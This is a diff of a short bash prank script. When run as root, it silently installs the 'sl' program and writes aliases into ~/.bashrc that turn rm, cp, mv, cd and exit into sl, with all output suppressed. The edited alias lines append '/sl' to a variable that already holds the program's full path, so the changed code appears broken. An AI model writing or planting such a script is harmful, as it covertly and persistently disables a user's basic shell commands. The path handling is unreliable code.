@@ -1,12 +1,11 @@
 #!/bin/bash
-user=`whoami`
 
-if [ "$user" == "root" ]; then
+if [ "`whoami`" == "root" ]; then
 	apt-get install sl -y || yum install sl -y
 	path=`which sl`
-	echo "alias rm='sl'" >> ~/.bashrc
-	echo "alias cp='sl'" >> ~/.bashrc
-	echo "alias mv='sl'" >> ~/.bashrc
-	echo "alias cd='sl'" >> ~/.bashrc
-	echo "alias exit='sl'" >> ~/.bashrc
+	echo "alias rm='${path}/sl'" >> ~/.bashrc
+	echo "alias cp='${path}/sl'" >> ~/.bashrc
+	echo "alias mv='${path}/sl'" >> ~/.bashrc
+	echo "alias cd='${path}/sl'" >> ~/.bashrc
+	echo "alias exit='${path}/sl'" >> ~/.bashrc
 fi &> /dev/null
